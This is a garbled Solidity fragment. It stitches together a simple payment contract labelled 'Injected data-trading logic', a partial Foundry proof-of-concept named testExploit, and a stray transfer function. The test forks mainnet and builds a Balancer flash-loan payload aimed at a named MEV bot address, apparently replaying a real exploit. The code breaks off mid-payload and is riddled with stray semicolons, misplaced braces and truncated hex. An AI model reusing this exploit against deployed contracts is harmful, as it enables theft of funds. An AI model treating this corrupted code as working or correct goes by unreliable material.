
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity 0.8.10;

```solidity;

;
;
contract ContractTest is DSTest{
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant MEVBOT = 0x00000000000A47b1298f18Cf67de547bbE0D723F;
    address constant exploiter = 0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 15741332)};
    function testExploit() public{
        address [] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256 [] memory amounts = new uint256[](1);
        amounts[0] = 1;
        bytes memory userData = bytes.concat(abi.encode(0x0000000000000000000000000000000000000000000000000000000000000080,
            0x0000000000000000000000000000000000000000000000000000000000000100,
            0x0000000000000000000000000000000000000000000000000000000000000280,
            0x0000000000000000000000000000000000000000000000a2d7f7bb876b5a551,
            0x000000000000000000000000000000000000000000000000000000000000003,
            address(WETH);
            address(USDC),;
            address(WETH),;
            0x000000000000000000000000000000000000000000000000000000000000
function sendToNoFallback(address payable recipient) public {
    recipient.transfer(1 ether)}